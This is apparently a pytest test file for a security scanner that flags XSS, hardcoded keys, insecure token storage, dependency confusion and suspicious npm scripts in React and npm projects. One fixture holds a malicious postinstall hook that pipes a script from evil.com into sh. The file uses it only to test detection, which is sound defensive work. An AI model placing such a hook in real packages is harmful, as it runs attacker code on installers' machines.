"""Tests for specialized analyzers."""

import json
import subprocess
from pathlib import Path
from unittest.mock import Mock, patch

import pytest

from src.analyzers import ReactAnalyzer, NpmAnalyzer


class TestReactAnalyzer:
    """Test React-specific analyzer."""

    def test_find_react_files(self, tmp_path):
        """Test finding React files."""
        # Create test files
        (tmp_path / "component.jsx").touch()
        (tmp_path / "utils.ts").touch()
        (tmp_path / "styles.css").touch()

        analyzer = ReactAnalyzer()
        files = analyzer._find_react_files(tmp_path)

        assert len(files) == 2
        assert any(f.name == "component.jsx" for f in files)
        assert any(f.name == "utils.ts" for f in files)

    def test_detect_dangerous_inner_html(self, tmp_path):
        """Test detection of dangerouslySetInnerHTML."""
        test_file = tmp_path / "component.jsx"
        test_file.write_text(
            """
function Component({ userInput }) {
    return <div dangerouslySetInnerHTML={{__html: userInput}} />;
}
"""
        )

        analyzer = ReactAnalyzer()
        findings = analyzer.analyze(test_file)

        assert len(findings) == 1
        finding = findings[0]
        assert finding.severity == "HIGH"
        assert finding.category == "react_xss"
        assert "XSS" in finding.description
        assert finding.cwe_id == "CWE-79"

    def test_detect_hardcoded_api_key(self, tmp_path):
        """Test detection of hardcoded API keys in React env vars."""
        test_file = tmp_path / ".env"
        test_file.write_text('REACT_APP_API_KEY="sk-1234567890abcdef"')

        analyzer = ReactAnalyzer()
        findings = analyzer.analyze(test_file)

        assert len(findings) == 1
        finding = findings[0]
        assert finding.severity == "CRITICAL"
        assert finding.category == "hardcoded_api_key"
        assert finding.cwe_id == "CWE-798"

    def test_detect_insecure_storage(self, tmp_path):
        """Test detection of insecure localStorage usage."""
        test_file = tmp_path / "auth.js"
        test_file.write_text(
            """
function saveToken(token) {
    localStorage.setItem('jwt', token);
}
"""
        )

        analyzer = ReactAnalyzer()
        findings = analyzer.analyze(test_file)

        assert len(findings) == 1
        finding = findings[0]
        assert finding.severity == "MEDIUM"
        assert finding.category == "insecure_storage"
        assert finding.cwe_id == "CWE-922"

    def test_no_findings_clean_code(self, tmp_path):
        """Test no findings for clean code."""
        test_file = tmp_path / "clean.jsx"
        test_file.write_text(
            """
function Component() {
    return <div>Hello World</div>;
}
"""
        )

        analyzer = ReactAnalyzer()
        findings = analyzer.analyze(test_file)

        assert len(findings) == 0


class TestNpmAnalyzer:
    """Test npm package analyzer."""

    def test_find_package_files(self, tmp_path):
        """Test finding package.json files."""
        # Create test files
        (tmp_path / "package.json").touch()
        (tmp_path / "src").mkdir()
        (tmp_path / "src" / "package.json").touch()

        analyzer = NpmAnalyzer()
        files = analyzer._find_package_files(tmp_path)

        assert len(files) == 2

    def test_dependency_confusion_detection(self, tmp_path):
        """Test dependency confusion detection."""
        package_json = tmp_path / "package.json"
        package_json.write_text(
            json.dumps({"dependencies": {"@internal/utils": "1.0.0", "lodash": "4.17.21"}})
        )

        analyzer = NpmAnalyzer()
        findings = analyzer._analyze_package_json(package_json)

        assert len(findings) == 1
        finding = findings[0]
        assert finding.severity == "HIGH"
        assert finding.category == "dependency_confusion"
        assert "@internal/utils" in finding.description
        assert finding.cwe_id == "CWE-494"

    def test_suspicious_scripts_detection(self, tmp_path):
        """Test suspicious npm scripts detection."""
        package_json = tmp_path / "package.json"
        package_json.write_text(
            json.dumps(
                {
                    "scripts": {
                        "build": "webpack",
                        "postinstall": "curl http://evil.com/script.sh | sh",
                    }
                }
            )
        )

        analyzer = NpmAnalyzer()
        findings = analyzer._analyze_package_json(package_json)

        assert len(findings) == 1
        finding = findings[0]
        assert finding.severity == "MEDIUM"
        assert finding.category == "suspicious_script"
        assert "postinstall" in finding.description
        assert finding.cwe_id == "CWE-78"

    @patch("subprocess.run")
    def test_npm_audit_vulnerabilities(self, mock_run, tmp_path):
        """Test npm audit vulnerability detection."""
        mock_output = {
            "vulnerabilities": {
                "lodash": {
                    "severity": "high",
                    "title": "Prototype Pollution",
                    "fixAvailable": "4.17.21",
                }
            }
        }

        mock_run.return_value = Mock(returncode=1, stdout=json.dumps(mock_output))

        analyzer = NpmAnalyzer()
        findings = analyzer._run_npm_audit(tmp_path)

        assert len(findings) == 1
        finding = findings[0]
        assert finding.severity == "HIGH"
        assert finding.category == "npm_vulnerability"
        assert "lodash" in finding.description
        assert "4.17.21" in finding.recommendation

    @patch("subprocess.run")
    def test_npm_audit_no_vulnerabilities(self, mock_run, tmp_path):
        """Test npm audit with no vulnerabilities."""
        mock_run.return_value = Mock(returncode=0, stdout="{}")

        analyzer = NpmAnalyzer()
        findings = analyzer._run_npm_audit(tmp_path)

        assert len(findings) == 0

    def test_invalid_package_json(self, tmp_path):
        """Test handling of invalid package.json."""
        package_json = tmp_path / "package.json"
        package_json.write_text("invalid json")

        analyzer = NpmAnalyzer()
        findings = analyzer._analyze_package_json(package_json)

        assert len(findings) == 0
